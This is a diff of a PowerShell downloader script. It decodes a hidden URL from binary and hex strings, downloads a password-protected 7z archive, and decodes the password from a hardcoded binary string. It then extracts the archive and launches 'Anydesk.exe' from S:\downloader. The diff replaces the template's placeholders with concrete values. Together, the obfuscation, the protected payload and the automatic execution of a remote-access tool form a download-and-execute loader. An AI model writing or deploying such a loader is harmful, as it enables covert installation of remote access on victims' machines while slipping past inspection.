@@ -27,16 +27,16 @@ Function Download-File {
 
 # Function to download and extract 7-Zip command line version
 Function DownloadAndExtract7Zip {
-    $sevenZipUrl = "https://www.7-zip.org/a/7z1900-extra.7z"
-    $sevenZipDownloadPath = ".\7zip.7z"
-    $sevenZipExtractPath = ".\7zip"
+    $sevenZipUrl = "https://www.7-zip.org/a/7za920.zip"
+    $sevenZipDownloadPath = "S:\downloader\7za.zip"
+    $sevenZipExtractPath = "S:\downloader\7zip"
     Invoke-WebRequest -Uri $sevenZipUrl -OutFile $sevenZipDownloadPath
-    & 7z x $sevenZipDownloadPath -o$sevenZipExtractPath
+    & Expand-Archive -Path $sevenZipDownloadPath -DestinationPath $sevenZipExtractPath
 }
 
 # Function to decrypt hardcoded binary string to get password
 Function Get-DecryptedPassword {
-    $hardcodedBinary = "your_hardcoded_binary_string_here" # Replace with your hardcoded binary
+    $hardcodedBinary = "0011000100110010001100110011010000110101" # Replace with your hardcoded binary
     $binaryGroups = $hardcodedBinary -split '(?<=\G.{8})'
     $password = ($binaryGroups | ForEach-Object { [convert]::ToChar([convert]::ToInt32($_, 2)) }) -join ''
     return $password
@@ -52,7 +52,7 @@ $hexString = Convert-BinaryToHex -binaryString $binaryString
 $finalUrl = Convert-HexToASCII -hexString $hexString
 
 # Download the target file
-$downloadPath = ".\DownloadedFile.7z"
+$downloadPath = "S:\downloader\DownloadedFile.7z"
 Download-File -url $finalUrl -path $downloadPath
 
 # Download and extract 7-Zip
@@ -60,11 +60,11 @@ DownloadAndExtract7Zip
 
 # Get password and unzip the downloaded file
 $password = Get-DecryptedPassword
-$sevenZipCmdPath = ".\7zip\7z.exe"
-& $sevenZipCmdPath x $downloadPath -o".\ExtractedFile" -p$password
+$sevenZipCmdPath = "S:\downloader\7zip\7z.exe"
+& $sevenZipCmdPath x $downloadPath -o"S:\downloader\" -p$password
 
 # Execute the extracted file
-$extractedFilePath = ".\ExtractedFile\YourExecutable.exe" # Update this path as necessary
+$extractedFilePath = "S:\downloader\Anydesk.exe" # Update this path as necessary
 if (Test-Path -Path $extractedFilePath) {
     Invoke-Item $extractedFilePath
 } else {
